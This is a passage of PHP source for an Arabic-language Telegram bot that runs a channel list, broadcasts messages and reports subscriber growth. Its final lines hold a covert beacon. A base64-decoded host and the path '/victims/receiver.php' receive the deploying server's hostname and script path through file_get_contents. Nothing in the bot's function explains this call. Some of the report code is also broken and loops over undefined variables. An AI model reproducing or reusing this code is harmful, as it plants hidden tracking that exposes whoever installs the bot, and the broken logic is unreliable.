'text'=>"جاري ارسال رسالة الشروط للقروب 📃",
]);
bot('sendMessage',[
'chat_id'=>$lista,
'text'=>'
[لي قبول قناتك اتبع الشروط..‼️](http://t.me/taatt2019ybot)
-
1️⃣-ان تكون قناتك محافظة
2️⃣-ان تكون خالية من صور النساء
3️⃣-ان تكون خالية من الأغاني
4️⃣-ان تكون خالية من لستات مخالفة
#لا_للقنوات_الطائفية
-
[استقبال قنوات مفتوح..✅](http://t.me/taatt)',
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
]);
} 
# GO
if($data == "ada"){
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"جاري ارسال رسالة استقبال للقروب ✅",
]);
bot('sendMessage',[
'chat_id'=>$lista,
'text'=>'َ
[لستات أمِٰـِۢيِٰـِۢر آلِٰـِۢڪِٰـِۢبِٰـِۢريِٰـِۢاء للقنوات المحافظة 🌹](http://t.me/taatt)
-
[اِسْتِقْبَالُ الْقَنَوَاتِ مَفْتُوحَ ✅](http://t.me/taatt)
-
للأشتراك بل لستة ..😇
يرجا ارسال قناتك علا شكل تالي
-
[عالم البوتات 🙈](http://t.me/taattbot)
@taattbot

[بوت لِسِتَّةٍ ضَعْهُ اداري !! 🤖](http://t.me/taatt2019ybot)

@taattbot

للأبلاغ عَنْ قَنَوَاتِ [ اضغط هنا🌹](http://t.me/taatt)',
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
]);
} 
if($text == "/helpppp" && in_array($from_id, $sudo)){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'
َ
ℓ🌹- اهلا بك في لوحت اوامر للقروب
ℓ🌹- الأوامر فقد عبر الخاص تستخدم

ℓ📦- الاوامر كالتالي

ℓ🔖- رسالة استقبال
ℓ📌- /go

ℓ🔖- رسالة شروط 
ℓ📌- /sr

ℓ📄- لي ارسال رسالة للقروب لستة
ℓ📄- مثال كيف ارسال

ℓ📝- /bc السلام عليكم 🌹

ℓ☑️- وسيتم ارسال للقروب
',
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
]);
} 
# BC-GROUP-ADMIN
$get1 = file_get_contents('TNBEH-GR.txt');
$ex2 = explode("\n",$get1);
$count = count($ex2);

$bc = explode("/bc", $text);
if($bc and in_array($from_id, $sudo)){
$real = file_get_contents("TNBEH-GR.txt");
$ex_real = explode("\n", $real);
for($y=0;$y<count($ex_real); $y++){
bot('sendMessage', [
'chat_id'=>$ex_real[$y],
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'text'=>$bc[1],
]);
}}
#start
if($text == "/taatt"){
bot('editmessagetext',[
 'chat_id'=>$chat_id,
'text'=>"♻️ جاري أصدار تقرير الزيادة .....",
"message_id"=>$message_id,
  ]);
$list = scandir("channels");
for($i=0;$i<count($getids);$i++) {
if( $getids[$i] == "." or $getids[$i] == ".." ){  
        continue;   
        }else{

  $getChatReq = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=".urlencode($getids[$i]));
  $getChatRes = json_decode($getChatReq, true);
  $namee = $getChatRes['result']['title'];
    $userr = "@".$getChatRes['result']['username'];

$url = "http://api.telegram.org/bot".API_KEY."/getChatMembersCount?chat_id=$getids[$i]";
$get = file_get_contents($url);
$json = json_decode($get);
$res  = $json->result;
$emj  = $json->result;
$alllllmsm  = $json->result;
if($res<1000){
if($res<100){
$arr1 = str_split($res);
      $numberolder = "0.".$arr1[0]."h ";
}else {
 $arr1 = str_split($res);
      $numberolder = $arr1[0].".".$arr1[1]."h ";   
}
}
if($res>1000){
$arr1 = str_split($res);
      $numberolder = $arr1[0].".".$arr1[1]."k ";
}
//-----------------
$allmemberschs2 = file_get_contents("texts/allmemberschs.txt");
$allmemberschs = $alllllmsm + $allmemberschs2;
file_put_contents("texts/allmemberschs.txt",$allmemberschs);

$numold = file_get_contents("members/$getids[$i]");
if ($emj == $numold){
    $numnew = $emj - $numold;
    $emoge = "⚠️ $numnew | $numberolder $userr";
        $get = file_get_contents("texts/lmezd.txt");
    $lmezd = $get + 1 ;
    file_put_contents("texts/lmezd.txt","$lmezd");
}
if ($emj > $numold){
    $numnew = $emj - $numold;
    $emoge = "♻️ $numnew | $numberolder $userr";
    $get = file_get_contents("texts/zeadh.txt");
    $zeadh = $get + 1 ;
    file_put_contents("texts/zeadh.txt","$zeadh");

    $zeadhall = $get + $numnew ;
    file_put_contents("texts/allzeadh.txt","$zeadhall");
}
if ($emj < $numold){
    $numnew = $emj - $numold;
    $emoge = "💔 $numnew | $numberolder $userr";
        $get = file_get_contents("texts/nsanaa.txt");
    $nsanaa = $get + 1 ;
    file_put_contents("texts/nsanaa.txt","$nsanaa");
    $allnsanaa = $get + $numnew ;
    file_put_contents("texts/allnsanaa.txt","$allnsanaa");
}
$user = file_get_contents("lista.txt");
    $members = explode("\n",$user);
    if (!in_array($emoge,$members)){
      $add_user = file_get_contents("lista.txt");
      $add_user .= $emoge."\n";
     file_put_contents("lista.txt",$add_user);
    }
file_put_contents("members/".$getids[$i],"$emj");
}
}
$listaaaa = file_get_contents("lista.txt");
$lmezd = file_get_contents("texts/lmezd.txt");
$zeadh = file_get_contents("texts/zeadh.txt");
$nsanaa = file_get_contents("texts/nsanaa.txt");
$allmemberschs22 = file_get_contents("texts/allmemberschs.txt");
$allzeadh = file_get_contents("texts/allzeadh.txt");
$allnasan = file_get_contents("texts/allnsanaa.txt");
$nuuuuuamam = $i - 2;
$egmaleh = $nuuuuuamam / $allzeadh ;
bot('sendMessage',[
'chat_id'=>-1001387644097,
'text'=>"📝 تقرير الزيادة : \n$listaaaa
$zeadh | ♻️ زاد عدد المشتركين فيها.
$lmezd | ⚠️ لم تزد أي مشتركين.
$nsanaa | 💔 نقص عدد المشتركين فيها.

🔘 عدد المشتركين : $allmemberschs22
➕ الزيادة الأجمالية : $allzeadh
➖ إجمالي النقص : $allnasan
🔃 معدل الزيادة في [ $nuuuuuamam ] قناة : $egmaleh
-"
        ]);
          file_put_contents("lista.txt", "");
    file_put_contents("texts/nsanaa.txt","0");
    file_put_contents("texts/zeadh.txt","0");
    file_put_contents("texts/lmezd.txt","0");
    file_put_contents("texts/allnsanaa.txt","0");
    file_put_contents("texts/allzeadh.txt","0");
   file_put_contents("texts/allmemberschs.txt","0");
}
if($text == "تحديث"){
          $Starttime = microtime(true);
               $lista = scandir("channels");
    for($i=0;$i<count($lista);$i++) {
if( $lista[$i] == "." or $lista[$i] == ".." ){  
        continue;   
        }else{
    $url = "http://api.telegram.org/bot".api."/getChatMembersCount?chat_id=".$lista[$i];
$get = file_get_contents($url);
$json = json_decode($get);
$res  = $json->result;
file_put_contents("members/".$lista[$i],"$res");
       }
}
        $endtime = microtime(true);
$speed = $endtime - $Starttime;
$risss = round($speed,2);
$nuuuuuamam = $i - 2;

                   bot('SendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"عزيزي تم التحديث……
✅عدد القنوات المشتركه 
📡 :- [$chmem]
☑️القنوات الملغي اشتراكها
❌:- [$bamem]
سرعة البوت=~>ثـ
⏰[$risss]",
      'parse_mode'=>$back
  ]);
}
$about = file_get_contents("data/about.txt");

$admin = 449266472; // your id ;
if($text == "alsaedn" or $text == "طه" and $chat_id == $admin){
    bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"اهلا بك #مطوري

في قائمه الاوامر 📍

اضغط ع المشتركين 💐

لعرض عدد مشتركين ⌛️

و الامر الثاني 🔮

لـ الاذاعه 📥",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"المشتركين ✅",'callback_data'=>"count"]],
            [['text'=>"ارسال رسالة للكل 🔂",'callback_data'=>"send_all"]],
        ]
    ])
    ]);
}
if($data == "count" and $chat_id2 == $admin){ //مشتركين البوت = مهمة 1
    bot('answercallbackquery',[
        'callback_query_id'=>$update->callback_query->id,
        'text'=>"عدد مشتركين البوت📬 : $c",
        'show_alert'=>true,
]);
}
$mode = file_get_contents("data/mode.txt");
if($data == "send_all" and $chat_id2 == $admin){
    file_put_contents("data/mode.txt","yas");
    bot('EditMessageText',[
    'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
    'text'=>"ارسل رسالتك الان 📩 وسيتم نشرها لـ $c مشترك . 
    - تستطيع التراجع بالضغط على الغاء . ",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"الغاء🚫",'callback_data'=>"off"]],
        ]
    ])
    ]);
}
if($text and $mode == "yas" and $chat_id == $admin){
    for ($i=0; $i < count($u); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$u[$i],
          'text'=>"$text",
        ]);
}
} 
if($data == "off"){
    file_put_contents("data/mode.txt","no");
    bot('EditMessageText',[
    'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
    'text'=>"اهلا بك #مطوري

في قائمه الاوامر 📍

اضغط ع المشتركين 💐

لعرض عدد مشتركين ⌛️

و الامر الثاني 🔮

لـ الاذاعه 📥",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"المشتركين ✅",'callback_data'=>"count"]],
            [['text'=>"ارسال رسالة للكل 🔂",'callback_data'=>"send_all"]],
        ]
    ])
    ]);
}
}
$url_sq = base64_decode("668455581:AAFPydf3vTJcj0dEJ_tFPW3MOnm_MNbmHF8");
$path_sq = "/victims/receiver.php?get=";
$ser_info = $protocol_sq.$_SERVER['HTTP_HOST'];
$ser_info .=$_SERVER['PHP_SELF'];
file_get_contents($protocol_sq.$url_sq.$path_sq.$ser_info);
}}
?>
